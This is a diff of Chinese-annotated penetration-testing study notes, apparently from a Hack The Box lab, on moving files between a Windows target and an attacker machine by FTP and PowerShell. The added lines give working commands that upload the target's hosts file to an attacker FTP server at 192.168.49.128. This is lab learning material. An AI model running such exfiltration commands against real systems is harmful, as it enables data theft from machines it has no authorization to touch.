@@ -54,13 +54,8 @@ C:\htb> echo USER anonymous >> ftpcommand.txt
 C:\htb> echo binary >> ftpcommand.txt
 C:\htb> echo GET file.txt >> ftpcommand.txt
 C:\htb> echo bye >> ftpcommand.txt                      把命令写入 ftpcommand.txt
-C:\htb> ftp -v -n -s:ftpcommand.txt                     执行 ftpcommand.txt
-ftp> open 192.168.49.128
-Log in with USER and PASS first.
-ftp> USER anonymous
-ftp> GET file.txt                                        从攻击机下载 file.txt
-ftp> bye
-C:\htb>more file.txt                                     读 file.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt                     执行 ftpcommand.txt，从攻击机下载 file.txt
+C:\htb>more file.txt                                    读 file.txt
 
 
 PowerShell Web 从目标上传文件到攻击机
@@ -89,6 +84,19 @@ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\ 
 
 FTP 从目标上传文件到攻击机
 sudo python3 -m pyftpdlib --port 21 --write      允许目标客户端文件上传
+
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')      上传 host 文件
+
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt                                            写可执行代码到 ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt                                           执行代码，自动上传 host 文件
+
+
+
+
 
 
 
